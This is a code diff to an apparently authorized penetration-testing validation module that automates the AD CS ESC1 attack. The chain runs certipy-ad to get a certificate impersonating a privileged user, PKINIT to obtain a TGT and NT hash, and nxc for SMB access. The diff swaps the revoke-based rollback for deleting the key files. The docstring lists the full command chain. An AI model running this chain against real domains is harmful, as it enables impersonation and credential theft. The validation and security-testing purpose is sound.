@@ -2,7 +2,7 @@
 
 Encodes the PROVEN ADCS-ESC1 recipe (claude-mem #66146 C1), parameterized and
 *mutating* (a certificate is issued on the vulnerable template, so a VERIFIED
-rollback -- revoking the issued cert -- is required):
+rollback -- destroying the issued key material -- is required):
 
     certipy-ad req  -u <op>@<dom> -p <pw> -dc-ip <dc> -ca <CA> -template <ESC1_tpl>
                     -upn <impersonate>@<dom> -target <ca_host> [-ldap-scheme ldap]
@@ -11,9 +11,12 @@ rollback -- revoking the issued cert -- is required):
         -> PKINIT -> TGT + NT hash
     nxc smb <target_host> -k
         -> ticket-backed access (terminal proof the cert was USABLE)
-    ROLLBACK:
-    certipy-ad ca -ca <CA> -revoke-request <SERIAL> -u <op>@<dom> -p <pw> -dc-ip <dc>
-        -> revoke the issued cert; verify = a revoke success marker
+    ROLLBACK (certipy has NO revoke in any version -- claude-mem #66157):
+    destroy the issued <impersonate>.pfx + PKINIT .ccache (the only private-key
+        copy). ESC1 changes no AD object, so destroying the bearer credential IS
+        a complete functional rollback; verify = confirmed file-absence. Formal
+        CA-DB revocation (certutil -revoke <serial> 6 / MS-CSRA) is an ADR-002 N3
+        follow-up, not required for functional rollback.
 
 Proven end-to-end on GOAD ESSOS (ESSOS-CA, ESC1 template, high-value SAN); the
 ADCS-ESC1 truth-vuln set is ``{host_id: srv03, domain: essos.local}`` (#66146 C1).
@@ -27,8 +30,9 @@ reset the connection. ``ldap_scheme`` exposes an operator-overridable
 
 Terminal fact: ``cert_issued_and_used`` -- a certificate was issued impersonating
 the high-value principal AND used for PKINIT AND that ticket gave access.
-Mutating: yes; the issued cert is ALWAYS revoked and the revoke is *verified*
-(the scorer calls an unverified rollback ``inconclusive``). The issued ``.pfx``,
+Mutating: yes; the rollback ALWAYS destroys the issued key material and is
+*verified* by confirmed file-absence (an unverified rollback scores
+``inconclusive``). The issued ``.pfx``,
 the recovered NT hash and the operator password are SECRETS: they live only in
 local vars / argv, are masked by :func:`redact_argv` (``-pfx`` / ``-hashes`` /
 ``-p``), and never reach the receipt (which also scrubs any pfx/hash/ccache key
@@ -47,12 +51,12 @@ laps.py / shadow_creds.py): certipy's output markers --
   (``Serial number: <hex>`` or, as a fallback, ``Request ID is <n>``);
 * ``auth``   : the PKINIT marker (``Got hash`` / ``authenticated`` / ``Got TGT``)
   and the credential-cache line (``Saved credential cache to '<...>.ccache'``);
-* ``ca`` revoke : the revoke success marker (``Successfully revoked`` /
-  ``Revoked certificate``).
+(No ``ca`` revoke marker is parsed -- certipy cannot revoke; the rollback is
+local key-material destruction, verified by file-absence, needing no tool output.)
 
 If the real wording differs, the chain gets no positive predicate / no parsed
-serial / no verified rollback and honestly reports not-proved / inconclusive --
-it never fabricates an issuance or a rollback.
+serial and honestly reports not-proved / inconclusive -- it never fabricates an
+issuance. The serial is still parsed for the audit advisory + the N3 revoke.
 """
 from __future__ import annotations
 
@@ -83,9 +87,6 @@ _RE_AUTH_OK = re.compile(r"(Got hash|authenticated|Got TGT)", re.I)
 # auth: the credential cache the ticket was saved to (for the -k nxc step).
 _RE_CCACHE = re.compile(
     r"Saved credential cache to ['\"]?([^'\"\s]+\.ccache)", re.I)
-# ca revoke: the revocation success marker.
-_RE_REVOKE_OK = re.compile(
-    r"(Successfully revoked|Revoked (the )?certificate|revocation succeeded)", re.I)
 # nxc ticket-backed access markers (shared with the delegation executors).
 _RE_NXC_PWNED = re.compile(r"\(Pwn3d!\)", re.I)
 _RE_NXC_AUTH_OK = re.compile(r"\bSMB\b.*\[\+\]", re.I)
@@ -100,8 +101,8 @@ class ADCSESC1Executor(ValidationExecutor):
     recipe_ref = ("#66146 C1 ADCS-ESC1 = certipy-ad req -template <ESC1> -upn "
                   "<impersonate>@<dom> -ca <CA> -target <cahost> [-ldap-scheme ldap] "
                   "(issue pfx+serial) ; certipy-ad auth -pfx -> PKINIT TGT+NThash ; "
-                  "nxc smb -k ; ROLLBACK certipy-ad ca -revoke-request <serial> "
-                  "(PROVED essos ESSOS-CA)")
+                  "nxc smb -k ; ROLLBACK destroy issued .pfx/.ccache key material "
+                  "(certipy has no revoke; #66157) (PROVED essos ESSOS-CA)")
 
     # ---------------------------------------------------------------- params
     def param_specs(self, ctx: ExecutorContext, finding) -> list[ParamSpec]:
@@ -292,16 +293,32 @@ class ADCSESC1Executor(ValidationExecutor):
             extra={"ca": ca, "template": template, "ca_host": ca_host},
         )
 
-        # 4) rollback (ALWAYS, since we issued a cert): revoke it + verify ---
-        self._rollback(ctx, ca, serial, op_auth, mutation, steps, errors, record, out_dir)
+        # 4) rollback (ALWAYS, since we issued a cert): destroy the key material.
+        self._rollback(ctx, ca, serial, mutation, steps, errors, pfx, ccache)
+        if mutation["applied"]:
+            # The recovered NT hash/TGT is unrollbackable -> advise rotation
+            # (non-secret: the impersonated principal + the public serial only).
+            errors.append(f"advisory:rotate_credentials:{impersonate}@{cfg.domain}")
+            if serial:
+                errors.append(f"advisory:ca_db_revocation_followup:serial={serial}")
 
         complete = bool(issued_ok and auth_ran and mutation["rollback"]["performed"])
         return self._artifact(steps, gate, mutation, terminal_fact, complete, errors)
 
     # ---------------------------------------------------------------- rollback
-    def _rollback(self, ctx, ca, serial, op_auth, mutation, steps, errors, record,
-                  out_dir) -> None:
-        """Revoke the issued certificate and verify the revocation (gated)."""
+    def _rollback(self, ctx, ca, serial, mutation, steps, errors, pfx, ccache) -> None:
+        """Destroy the issued key material -- the functional rollback for ESC1.
+
+        certipy cannot revoke a certificate in any version (claude-mem #66157),
+        and ESC1 changes NO AD object: the issued cert is a bearer credential, so
+        securely destroying the only private-key copy (the ``.pfx`` plus the
+        PKINIT ``.ccache``) means the cert can no longer be used -- a complete
+        functional rollback. ``rollback.verified`` is set from confirmed
+        file-absence. Formal CA-DB revocation (``certutil -revoke <serial> 6``
+        Certificate Hold via remote-exec, or the MS-CSRA RevokeCertificate
+        primitive) is an ADR-002 N3 follow-up for CA-database hygiene; it is not
+        needed for functional rollback and is not attempted here.
+        """
         if not mutation["applied"]:
             return
         if ctx.authorizer.authorize(
@@ -309,35 +326,45 @@ class ADCSESC1Executor(ValidationExecutor):
             errors.append("gate_denied:rollback")
             return
         mutation["rollback"]["performed"] = True
-        mutation["rollback"]["method"] = (
-            f"certipy ca revoke-request {serial}" if serial
-            else "certipy ca revoke-request <unparsed-serial>")
-        if not serial:
-            # A cert was issued but we could not parse its serial -> we cannot
-            # revoke it; report an honest unverified rollback (never fake it).
+        mutation["rollback"]["method"] = "destroy issued-cert key material (.pfx + .ccache)"
+        destroyed = self._destroy_key_material([pfx, ccache], steps)
+        mutation["rollback"]["verified"] = destroyed
+        if not destroyed:
             errors.append("rollback_unverified")
-            return
-        dc = ctx.config.dc_ip
-        revoke_argv = ["certipy-ad", "ca", "-ca", ca, "-revoke-request", serial,
-                       *op_auth, "-dc-ip", dc]
-        res = ctx.runner.run(revoke_argv, timeout=ctx.config.tool_timeout_s,
-                             cwd=str(out_dir))
-        revoke_out = (res.stdout or "") + (res.stderr or "")
-        revoke_ok = bool(_RE_REVOKE_OK.search(revoke_out))
-        record("rollback_revoke", revoke_argv, res, revoke_ok,
-               note="revoked" if revoke_ok else "revoke unconfirmed")
-        mutation["rollback"]["verified"] = revoke_ok
-        if not revoke_ok:
-            errors.append("rollback_unverified")
+
+    @staticmethod
+    def _destroy_key_material(paths, steps) -> bool:
+        """Delete each key-material file; return True iff all are absent after.
+
+        Records ONE ``destroy_key_material`` step with a count note -- never the
+        file names (the ``.pfx``/``.ccache`` paths are secret-flagged and must not
+        reach the receipt). A file that cannot be deleted leaves the step ``ok``
+        False -> the scorer reads an unverified (incomplete) rollback.
+        """
+        targets = [Path(p) for p in paths if p]
+        removed = 0
+        for fp in targets:
+            try:
+                if fp.exists():
+                    fp.unlink()
+                    removed += 1
+            except OSError:
+                pass
+        gone = all(not fp.exists() for fp in targets)
+        steps.append(StepRecord(
+            name="destroy_key_material", ok=gone, argv_display=[], returncode=None,
+            note=(f"{removed} artifact(s) destroyed" if gone
+                  else "key material still present")))
+        return gone
 
     # ---------------------------------------------------------------- helpers
     @staticmethod
     def _parse_serial(stdout: str) -> Optional[str]:
-        """Parse the issued cert serial (else a request id) for revocation.
+        """Parse the issued cert serial (else a request id) -- a public identifier.
 
-        A cert serial is a public identifier (not a secret); it is needed for the
-        ``certipy ca -revoke-request`` rollback. If neither a serial nor a request
-        id is found, rollback cannot run and is honestly reported unverified.
+        Not needed for the functional rollback (key-material destruction); it is
+        recorded for the operator audit advisory and the ADR-002 N3 formal CA-DB
+        revocation follow-up. Absent serial -> only the advisory is skipped.
         """
         m = _RE_SERIAL.search(stdout)
         if m:
